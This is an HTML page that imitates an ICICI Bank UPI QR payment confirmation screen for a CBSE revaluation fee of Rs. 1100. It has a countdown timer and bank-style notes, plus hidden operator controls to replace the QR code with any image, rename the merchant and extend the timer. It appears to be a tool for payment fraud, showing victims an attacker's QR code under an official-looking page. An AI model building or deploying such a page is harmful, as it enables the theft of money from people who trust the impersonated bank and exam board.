<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR Payment Confirmation</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; position: relative; }
        .container { max-width: 400px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; color: #333; }
        .title { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #28a745; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .timer { color: #28a745; font-size: 28px; font-weight: bold; }
        .refresh-btn { background: #007bff; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; margin-left: 10px; }
        .instruction { margin: 15px 0; font-size: 14px; color: #666; line-height: 1.4; }
        .qr-container { text-align: center; margin: 20px 0; position: relative; }
        .qr-code { width: 200px; height: 200px; border: 1px solid #ddd; display: inline-block; margin-bottom: 10px; position: relative; }
        .upload-icon { position: absolute; bottom: 10px; right: 10px; font-size: 24px; background: rgba(255,255,255,0.8); border-radius: 50%; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: transform 0.2s; z-index: 5; }
        .upload-icon:hover { transform: scale(1.1); }
        .merchant-display { text-align: center; font-weight: bold; color: #dc3545; font-size: 16px; margin-top: 10px; display: none; }
        .sidebar { position: fixed; right: 20px; top: 50%; transform: translateY(-50%); background: rgba(255,255,255,0.9); border-radius: 8px; padding: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); display: flex; flex-direction: column; gap: 15px; z-index: 10; }
        @media (max-width: 400px) { .sidebar { display: none; } } /* Hide on small screens */
        .icon { font-size: 20px; cursor: pointer; padding: 5px; border-radius: 4px; transition: background 0.2s; position: relative; }
        .icon:hover { background: #e9ecef; }
        .tooltip { visibility: hidden; position: absolute; right: 30px; top: 50%; transform: translateY(-50%); background: #333; color: white; padding: 5px 10px; border-radius: 4px; font-size: 12px; white-space: nowrap; z-index: 11; }
        .icon:hover .tooltip { visibility: visible; }
        .merchant-input { position: absolute; right: 40px; top: 100%; width: 150px; padding: 4px; border: 1px solid #ddd; border-radius: 4px; font-size: 12px; display: none; z-index: 12; }
        .notes { margin-top: 20px; }
        .notes h3 { font-size: 16px; color: #333; }
        .notes ul { font-size: 12px; color: #666; line-height: 1.5; padding-left: 20px; }
        .status { text-align: center; font-weight: bold; color: #dc3545; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="title">Awaiting QR Payment Confirmation <span class="spinner"></span><span class="timer" id="timer">4:38</span></h1>
            <button class="refresh-btn" onclick="location.reload()">Refresh</button>
        </div>
        
        <p class="instruction" id="merchantInstr">Transaction is being processed, towards <span id="merchantName">SECRETARY CBSE REVALUATION</span> amounting to Rs. 1100.</p>
        <p class="instruction">Please do not press 'Refresh' or 'Back' button.</p>
        <p class="instruction">Please approve/process the payment request, through the respective Payment service provider (PSP) mapped UPI application with in 5 minutes.</p>
        
        <div class="qr-container">
            <div class="qr-code" id="qrCodeWrapper">
                <svg class="qr-code" id="qrCode" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
                    <!-- Placeholder QR pattern -->
                    <rect width="200" height="200" fill="#000" opacity="0.1"/>
                    <rect x="10" y="10" width="20" height="20" fill="#000"/>
                    <rect x="170" y="10" width="20" height="20" fill="#000"/>
                    <rect x="10" y="170" width="20" height="20" fill="#000"/>
                    <rect x="170" y="170" width="20" height="20" fill="#000"/>
                    <text x="100" y="100" text-anchor="middle" fill="#666" font-size="12">QR Code</text>
                </svg>
                <div class="upload-icon" onclick="document.getElementById('qrUpload').click()" title="Add QR Code">‚ûï</div>
            </div>
            <div class="merchant-display" id="merchantDisplay"></div>
        </div>
        
        <div class="notes">
            <h3>Notes:</h3>
            <ul>
                <li>ICICI Bank will not accept conditional and/or part payment.</li>
                <li>Transaction Valid for next 5 Minutes from the time of payment request initiation/generation.</li>
                <li>Transaction will be Marked as Failed, if Transaction Status is not processed with Successful Payment with in 5 Minutes.</li>
                <li>In case Transaction Expired, you can reinitaite the transaction subjective on the Merchant Transaction Validity.</li>
                <li>Successful receipt can be generated through ezpay Portal - Transaction History Option.</li>
            </ul>
        </div>
        
        <div class="status" id="status">Transaction Expired - Marked as Failed</div>
    </div>

    <!-- Sidebar with Mini Icons (QR Edit Removed) -->
    <div class="sidebar">
        <div class="icon" onclick="increaseTime()" title="Increase Time">
            ‚è∞
            <span class="tooltip">Increase Time (+1 min)</span>
        </div>
        <div class="icon" id="merchantIcon" onclick="toggleMerchantInput()" title="Update Merchant">
            üè™
            <span class="tooltip">Update Merchant</span>
            <input type="text" id="merchantInput" class="merchant-input" placeholder="Merchant Name" value="SECRETARY CBSE REVALUATION" onblur="editMerchant(); toggleMerchantInput()" onkeypress="if(event.key==='Enter') { editMerchant(); toggleMerchantInput(); }">
        </div>
    </div>

    <input type="file" id="qrUpload" accept="image/*" style="display: none;" onchange="editQR(event)">

    <script>
        let timeLeft = 4 * 60 + 38; // 4:38 in seconds
        const timerEl = document.getElementById('timer');
        const statusEl = document.getElementById('status');
        const merchantEl = document.getElementById('merchantName');
        const merchantInput = document.getElementById('merchantInput');
        const merchantIcon = document.getElementById('merchantIcon');
        const merchantDisplay = document.getElementById('merchantDisplay');
        const qrWrapper = document.getElementById('qrCodeWrapper');
        
        function updateTimer() {
            if (timeLeft <= 0) {
                timerEl.textContent = '0:00';
                statusEl.style.display = 'block';
                return;
            }
            const mins = Math.floor(timeLeft / 60);
            const secs = timeLeft % 60;
            timerEl.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
            timeLeft--;
        }
        
        setInterval(updateTimer, 1000);
        updateTimer(); // Initial call
        
        function setQRImage(src, isPaste = false) {
            const qrEl = document.getElementById('qrCode');
            qrEl.outerHTML = `<img src="${src}" id="qrCode" class="qr-code" alt="Edited QR" style="width:200px;height:200px;">`;
            if (isPaste) {
                merchantDisplay.textContent = 'CBSE PAYMENT';
                merchantDisplay.style.color = '#dc3545';
                merchantDisplay.style.display = 'block';
            }
        }
        
        function editQR(event) {
            const file = event.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    setQRImage(e.target.result);
                };
                reader.readAsDataURL(file);
            }
        }
        
        document.addEventListener('paste', function(e) {
            if (e.clipboardData && e.clipboardData.items) {
                for (let item of e.clipboardData.items) {
                    if (item.type.startsWith('image/')) {
                        e.preventDefault();
                        const blob = item.getAsFile();
                        if (blob) {
                            const url = URL.createObjectURL(blob);
                            setQRImage(url, true);
                        }
                        break;
                    }
                }
            }
        });
        
        function increaseTime() {
            timeLeft += 60; // +1 min
            if (statusEl.style.display === 'block') statusEl.style.display = 'none';
            updateTimer();
        }
        
        function toggleMerchantInput() {
            const input = merchantInput;
            if (input.style.display === 'block') {
                input.style.display = 'none';
            } else {
                input.style.display = 'block';
                input.focus();
            }
        }
        
        function editMerchant() {
            const newName = merchantInput.value.trim();
            if (newName && newName !== merchantEl.textContent) {
                merchantEl.textContent = newName;
                merchantEl.style.color = '#dc3545'; // Red color
                merchantDisplay.textContent = newName; // Show below QR
                merchantDisplay.style.display = 'block';
                console.log('Merchant updated to:', newName);
            } else if (!newName) {
                alert('Merchant name cannot be empty.');
                merchantInput.value = merchantEl.textContent; // Revert
            }
        }
    </script>
</body>
</html>